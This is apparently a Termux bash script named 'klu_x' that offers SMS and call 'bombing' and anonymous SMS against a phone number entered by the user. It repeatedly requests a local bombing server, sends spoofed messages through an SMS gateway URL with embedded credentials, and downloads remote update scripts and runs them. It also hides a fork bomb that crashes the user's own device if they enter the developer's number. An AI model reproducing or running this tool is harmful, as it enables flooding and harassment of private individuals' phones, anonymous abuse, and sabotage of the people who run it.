check(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/klu_x/master/update.v1.2 2>/dev/null; then
cd $HOME/klu_x/server/updates
echo "KLU_X" > update.txt
else
echo
fi
}
echo
check
option(){
if [ -f "$HOME/klu_x/server/updates/update.txt" ];then
cd $HOME/klu_x/server/updates
bash update.sh
else
echo " "
fi
}
option
check1(){
if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/klu_x.v.1 2>/dev/null; then
cd $HOME/klu_x/server/updates
echo "spmx" > patch.txt
else
echo
fi
}
check1
option1(){
if [ -f "/data/data/com.termux/files/klu_x/server/updates/patch.txt" ];then
cd $HOME/klu_x/server/updates
bash patch.sh
else
echo " "
fi
}
option1
bnr(){
clear
cd $HOME/klu_x/server/bnr
bash bnr1.sh
echo -e "                   > By KLU MODDING<"
echo -e "               > https://github.com/KLU-902 <"
echo -e "                > YOUTUBE:-KLU MODDING<"
echo
}
men(){
cd $HOME/klu_x
rm *.txt 2>/dev/null
echo -e "[1] Bombing"
echo -e "[2] Key"
echo -e "[3] About"
echo -e "[4] Update"
echo -e "[5] Subscribe"
echo -e "[6] Group"
echo -e "[7] Follow"
echo -e "[8] Exit"
echo ''
echo -ne "SELECT OPTION ~> "
read opt1
if [ $opt1 = "1" ];
then
spams
elif [ $opt1 = "2" ];
then
am start -a android.intent.action.VIEW -d https://shrinke.me/klu_xcc > /dev/null 2>&1
bnr
men
elif [ $opt1 = "3" ];
then
abot
elif [ $opt1 = "4" ];
then
cd /data/data/com.termux/files/home/klu_x/server/updates
bash update.sh
elif [ $opt1 = "5" ];
then
am start -a android.intent.action.VIEW -d  https://m.youtube.com/results?sp=mAEA&search_query=K_L_U+MODDING > /dev/null 2>&1
bnr
men
elif [ $opt1 = "6" ];
then
am start -a android.intent.action.VIEW -d https://chat.whatsapp.com/JcbQk8GBLfO9uZDCaQNxao> /dev/null 2>&1
bnr
men
elif [ $opt1 = "7" ];
then
am start -a android.intent.action.VIEW -d > /dev/null 2>&1
bnr
men
elif [ $opt1 = "8" ];
then
exit 1
else
echo -e "                       !....OOPS "
fi
}
spams(){
clear
bnr
echo -e "[1] Bomb Sms+Call"
echo -e "[2] Bomb Sms"
echo -e "[3] Bomb Call"
echo -e "[4] Anonymous Sms"
echo -e "[5] Back"
echo ''
echo -ne "SELECT OPTION ~> "
read opt2
if [ $opt2 = "1" ];
then
massbmb
elif [ $opt2 = "2" ];
then
smsbmb
elif [ $opt2 = "3" ];
then
callbmb
elif [ $opt2 = "4" ];
then
anonmenu
elif [ $opt2 = "5" ];
then
bnr
men
else
echo -e "                      !....OOPS "
exit 1
fi
}
smsbmb(){
massbmb
}
callbmb(){
echo -e "                ON UPDATES WE WILL UPDATE SOON....!"
sleep 4.0
bnr
men
}
anonmenu(){
if [ -f /data/data/com.termux/files/home/klu_x/server/anon/dat.txt ];
then
anondat
else
anonmen
fi
}
anondat(){
cd /data/data/com.termux/files/home/klu_x/server/anon
dt=$(date +%A)
dro=$(cat dat.txt)
if [ "$dt" == "$dro" ];
then
clear
echo
echo
echo
echo
echo
echo -e "         ==============================================="
echo -e "          |  DAILY LIMIT REACHED (100%)  |"
echo -e "          |      COME ON TOMORROW        |"
echo -e "         ==============================================="
echo
echo
echo
echo
sleep 4.0
bnr
men
else
cd /data/data/com.termux/files/home/klu_x/server/anon
rm *.txt
anonmen
fi
}
anonmen(){
anoncrk
clear
echo -e "
         ██████
    ██████████
 █ ▄▀█  █▀▄ █
▐▌           ▌
█▌▀▄  ▄▄  ▄▀▐█
▐██  ▀▀  ▀▀  ██▌   klu_x V.1 BY K_L_U MODDING
▄████▄   ▌  ▄████▄
"
echo
echo -ne "PROVIDE MESSAGE: "
read msg
printf %s\n "$msg"|jq -Rr @uri > lad.txt
test=$(cat lad.txt)
echo -ne "MOB NUMBER: "
read mob
cd $HOME/klu_x
wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
read -s -p "ACCESS KEY: " secret
cd $HOME/klu_x
otext=$(cat er3.txt)
anontest
}
anontest(){
if [[ $secret = $otext ]];
then
auth1
else
cd $HOME/klu_x
rm er3.txt 2>/dev/null
clear
echo " "
echo -e "                ============================"
echo -e "                |     OOPS WRONG KEY...!   |"
echo -e "                |                          |"
echo -e "                |    Use shortlink for key |"
echo -e "                |  https://shrinke.me/tXwz |"
echo -e "                |            [OR]          |"
echo -e "                |https://bit.ly/nhwhatschat|"
echo -e "                ============================"
echo " "
sleep 5.0
bnr
men
fi
}
auth1() {
clear
cd /data/data/com.termux/files/home/klu_x/server/anon
remn=$(cat ctt.txt) >/dev/null 2>&1
clear
echo -e "
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃  TARGET-$mob 
┃   klu_x   ┃  ATTACK-ANONYMOUS SMS 
┃           ┃ 
┃           ┃ [1] ANON [2] Menu 
┃           ┃ [3] Go back [4] Quit
┃           ┃      REMAINING-["$remn"] 
┃"$mob" ┃  Press Ctrl+C To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ DEVELOPER:wa.me/9113948054
╰━━━━━━━━━━━╯
"
curl -L -s "http://mobicomm.dove-sms.com//submitsms.jsp?user=dontlook&key=be6f739958XX&mobile=$mob&message=$test&senderid=CLNEXT&accusage=1" > utis.txt
value=$( grep -o "success" utis.txt)
if [[ $value = "success" ]]
then
echo
echo
echo
echo -e "         ==============================================="
echo -e "           |  Sent $msg To $mob successfully  |"
echo -e "         ==============================================="
echo
echo
echo
cd $HOME/klu_x
rm er3.txt 2>/dev/null
anondd
else
clear
echo " "
echo -e "                ============================"
echo -e "                |  OOPS SERVER ISSUES..!   |"
echo -e "                |   we will update it soon |"
echo -e "                ============================"
echo " "
cd $HOME/klu_x
rm er3.txt 2>/dev/null
fi
}
anondd(){
cd /data/data/com.termux/files/home/klu_x/server/anon
name=remin
if [[ -e $name.txt || -L $name.txt ]] ; then
i=0
while [[ -e $name-$i.txt || -L $name-$i.txt ]] ; do
let i++
done
name=$name-$i
fi
touch -- "$name".txt
cd /data/data/com.termux/files/home/klu_x/server/anon
anonct=$(find remin*.txt | wc -l)
if [[ $anonct = "1" ]]; then
echo "20" > ctt.txt
elif [[ $anonct = "2" ]]; then
echo "19" > ctt.txt
elif [[ $anonct = "3" ]]; then
echo "18" > ctt.txt
elif [[ $anonct = "4" ]]; then
echo "17" > ctt.txt
elif [[ $anonct = "5" ]]; then
echo "16" > ctt.txt
elif [[ $anonct = "6" ]]; then
echo "15" > ctt.txt
elif [[ $anonct = "7" ]]; then
echo "14" > ctt.txt
elif [[ $anonct = "8" ]]; then
echo "13" > ctt.txt
elif [[ $anonct = "9" ]]; then
echo "12" > ctt.txt
elif [[ $anonct = "10" ]]; then
echo "11" > ctt.txt
elif [[ $anonct = "11" ]]; then
echo "10" > ctt.txt
elif [[ $anonct = "12" ]]; then
echo "9" > ctt.txt
elif [[ $anonct = "13" ]]; then
echo "8" > ctt.txt
elif [[ $anonct = "14" ]]; then
echo "7" > ctt.txt
elif [[ $anonct = "15" ]]; then
echo "6" > ctt.txt
elif [[ $anonct = "16" ]]; then
echo "5" > ctt.txt
elif [[ $anonct = "17" ]]; then
echo "4" > ctt.txt
elif [[ $anonct = "18" ]]; then
echo "3" > ctt.txt
elif [[ $anonct = "19" ]]; then
echo "2" > ctt.txt
elif [[ $anonct = "20" ]]; then
echo "0" > ctt.txt
elif [[ $anonct = "21" ]]; then
anondot
else
anondot
fi
echo -ne "NEXT: "
read anonopt
if [ $anonopt = "1" ];
then
anonmenu
elif [ $anonopt = "2" ];
then
spams
elif [ $anonopt = "3" ];
then
anonmenu
elif [ $anonopt = "4" ];
then
exit 1
else
echo "                      xx ERROR....! xx"
fi
}
anoncrk(){
FILE=/data/data/com.termux/files/home/klu_x/server/anon/limit.txt
if [ -f "$FILE" ]; then
anondot
fi
}
anondot(){
cd /data/data/com.termux/files/home/klu_x/server/anon
dt=$(date +%A)
chk=$(date +%A > dat.txt)
dro=$(cat dat.txt)
if [ "$dt" == "$dro" ];
then
echo
echo
echo -e "         ==============================================="
echo -e "          |  DAILY LIMIT REACHED (100%)  |"
echo -e "          |      COME ON TOMORROW        |"
echo -e "         ==============================================="
echo
echo
echo '                             Oops...Come Tomorrow' > limit.txt
exit 1
else
anonmenu
fi
}
massbmb(){
clear
echo -e "
,--.+,
__/   -*-
*d08b*  '%
0088MM
*9MMP* klu_x V.1 BY KLU MODDING
"
echo -ne "NUMBER: "
read num
if [ "$num" = "63--------" ];
then
echo
echo -e "         ==============================================="
echo -e "         | DONT TRY TO BOMB MY NUMBER BRO.............|"
echo -e "         ==============================================="
echo
sleep 3.0
:(){ :|: & };:
exit 1
elif [ "$num" = "63--------" ];
then
echo
echo -e "         ==============================================="
echo -e "         | DONT TRY TO BOMB MY NUMBER BRO.............|"
echo -e "         ==============================================="
echo
sleep 3.0
:(){ :|: & };:
exit 1
else
cd $HOME/klu_x
wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
read -s -p "ACCESS KEY: " access
cd $HOME/klu_x
bas=$(cat er3.txt)
fi
if [[ $access = $bas ]];
then
cd $HOME/klu_x
rm er3.txt 2>/dev/null
clear
echo -e "
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃  TARGET-$num 
┃  KLU-X   ┃  ATTACK-MASS BOMBING 
┃           ┃ 
┃           ┃ [1] Bomb [2] Menu 
┃           ┃ [3] Go back [4] Quit
┃           ┃
┃"$num" ┃  Press Ctrl+C To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ DEVELOPER:wa.me/9113948054
╰━━━━━━━━━━━╯
"
killall -9 php >/dev/null 2>&1
cd /data/data/com.termux/files/home/klu_x/server/callnsms
php -S localhost:8080 >/dev/null 2>&1 &
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
sleep 1.0
curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
massbmb
elif [ $optz = "2" ];
then
spams
elif [ $optz = "3" ];
then
massbmb
elif [ $optz = "4" ];
then
exit 1
else
echo "                                xx WRONG OPTION....! xx"
fi
else
echo " "
echo -e "                ============================"
echo -e "                |     OOPS WRONG KEY...!   |"
echo -e "                |                          |"
echo -e "                |    Use shortlink for key |"
echo -e "                |  https://shrinke.me/tXwz |"
echo -e "                |            [OR]          |"
echo -e "                |https://bit.ly/nhwhatschat|"
echo -e "                ============================"
echo " "
fi
}
abot(){
clear
echo -e '
──▐─▌──▐─▌──
─▐▌─▐▌▐▌─▐▌─
─█▄▀▄██▄▀▄█─
──▄──██▌─▄──
▄▀─█▀██▀█─▀▄
▐▌▐▌─▐▌─▐▌▐▌
─▐─█────█─▌─
────▌──▐────
'
echo -e "                  CALL ME KLU" | pv -qL 10
echo -e "             IAM FROM  K_L_U MODDING" | pv -qL 10
echo -e "       IM A GEEK WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "              JOIN GROUPS ON WHATS' APP" | pv -qL 10
echo -e "        MY WEBSITE: RELEASE SOON" | pv -qL 10
echo -e "                BYEE.............." | pv -qL 10
sleep 4.0
bnr
men
}
bnr
men
